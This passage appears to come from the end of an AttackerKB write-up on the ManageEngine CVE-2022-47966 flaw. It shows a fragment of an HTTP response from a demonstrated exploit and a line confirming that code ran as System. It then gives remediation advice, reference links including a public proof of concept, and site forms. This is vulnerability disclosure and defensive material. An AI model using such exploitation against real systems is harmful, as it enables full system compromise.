Date: Fri, 20 Jan 2023 22:07:48 GMT
Connection: close
Server: -
[...]

```

Then we can verify that notepad.exe is indeed running on the target (as the privileged `System` user, to boot)!

## Guidance

The vulnerability should be remediated immediately, without waiting for a typical patch cycle. Any organization with a vulnerable ManageEngine service exposed to the public internet should examine their systems for signs of compromise in addition to remediating the vulnerability.

## References

* [Vendor advisory](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)
* [Discovery’s disclosure blog](https://blog.viettelcybersecurity.com/saml-show-stopper/)
* [Rapid7 blog](https://www.rapid7.com/blog/post/2023/01/19/etr-cve-2022-47966-rapid7-observed-exploitation-of-critical-manageengine-vulnerability/)
* [Horizon3’s writeup / PoC](https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/)
* [Horizon3’s IoCs](https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/)
* [Previous research](https://blog.tint0.com/2021/09/pinging-xmlsec.html)
* [Xalan prevalence](https://mvnrepository.com/artifact/xalan/xalan)

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/gvs0Gv8BID/cve-2022-47966/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/gvs0Gv8BID/cve-2022-47966/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)

